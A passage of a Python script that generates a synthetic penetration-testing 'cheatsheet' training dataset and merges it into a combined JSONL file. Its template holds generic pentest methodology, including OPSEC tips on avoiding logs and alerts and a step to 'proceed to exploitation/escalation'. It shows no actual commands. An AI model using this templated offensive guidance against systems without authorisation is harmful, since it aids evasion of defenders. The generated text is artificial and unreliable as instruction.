{chr(10).join(f"```bash{chr(10)}{cmd}{chr(10)}```{chr(10)}*{category[1]} - specific use case*{chr(10)}" for cmd in category[2])}

**Usage Context**:
During penetration testing, these commands help with {category[1]} by gathering essential information for the next phase.

**Order of Operations**:
1. Start with basic enumeration
2. Identify interesting findings
3. Deep dive into specific areas
4. Document for reporting

**Output Analysis**:
- Look for: Usernames, versions, configurations
- Note: Unusual entries or misconfigurations
- Save: Output for evidence

**OPSEC Considerations**:
- Commands may be logged
- Some may trigger alerts
- Use sparingly in sensitive environments

**Common Mistakes**:
- Running noisy commands too early
- Not saving output
- Missing obvious findings
- Over-enumeration when unnecessary

**Next Steps**:
After {category[1]}:
- Analyze findings
- Prioritize attack paths
- Document observations
- Proceed to exploitation/escalation"""
    })

with open(output_dir / "cheatsheets.jsonl", "w") as f:
    for sample in cheatsheet_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(cheatsheet_samples)} cheatsheet samples")

# =============================================================================
# MERGE ALL PART 2 FILES
# =============================================================================

print("\n" + "="*60)
print("Merging all elite2 dataset files...")

all_samples = []
for jsonl_file in output_dir.glob("*.jsonl"):
    if jsonl_file.name != "elite2_combined.jsonl":
        with open(jsonl_file) as f:
            for line in f:
                all_samples.append(json.loads(line))

# Shuffle for better training
random.shuffle(all_samples)

# Save combined file
combined_file = output_dir / "elite2_combined.jsonl"
with open(combined_file, "w") as f:
    for sample in all_samples:
        f.write(json.dumps(sample) + "\n")

print(f"\n✅ ELITE2 DATASET COMPLETE!")
print(f"   Total new samples: {len(all_samples)}")
print(f"   Output: {combined_file}")
print("="*60)
